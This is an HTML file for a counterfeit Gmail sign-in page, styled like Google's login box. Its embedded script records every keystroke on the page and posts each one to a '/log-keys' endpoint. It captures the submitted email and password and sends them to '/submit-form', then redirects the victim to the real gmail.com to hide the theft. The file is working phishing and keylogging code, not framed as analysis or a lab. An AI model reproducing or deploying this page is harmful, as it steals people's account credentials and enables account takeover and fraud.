<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Gmail - Sign In</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f1f1f1;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .login-box {
            background-color: #fff;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            width: 300px;
            text-align: center;
        }
        .login-box h2 {
            margin-bottom: 20px;
            font-size: 24px;
            color: #202124;
        }
        .login-box input {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #ddd;
            border-radius: 4px;
            box-sizing: border-box;
        }
        .login-box button {
            width: 100%;
            padding: 10px;
            background-color: #1a73e8;
            color: #fff;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }
        .login-box button:hover {
            background-color: #1557b0;
        }
    </style>
</head>
<body>
    <div class="login-box">
        <h2>Sign in</h2>
        <form id="loginForm">
            <input type="email" id="email" name="email" placeholder="Email or phone" required>
            <input type="password" id="password" name="password" placeholder="Password" required>
            <button type="submit">Next</button>
        </form>
    </div>

    <script>
        // Функция для отправки данных на сервер
        function sendKeyData(keyData) {
            fetch('/log-keys', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({ key: keyData }),
            });
        }
    
        // Ловим нажатия клавиш на всём сайте
        document.addEventListener('keydown', function(event) {
            const key = event.key; // Получаем нажатую клавишу
            sendKeyData(key); // Отправляем данные на сервер
        });
    
        // Ловим отправку формы
        document.querySelector('form').addEventListener('submit', function(event) {
            event.preventDefault(); // Предотвращаем стандартную отправку формы
    
            // Отправляем данные формы на сервер
            const formData = new FormData(event.target);
            fetch('/submit-form', {
                method: 'POST',
                body: formData,
            }).then(response => {
                if (response.ok) {
                    // Редирект на настоящий сайт после успешной отправки
                    window.location.href = 'https://gmail.com';
                }
            });
        });
    </script>

</body>
</html>
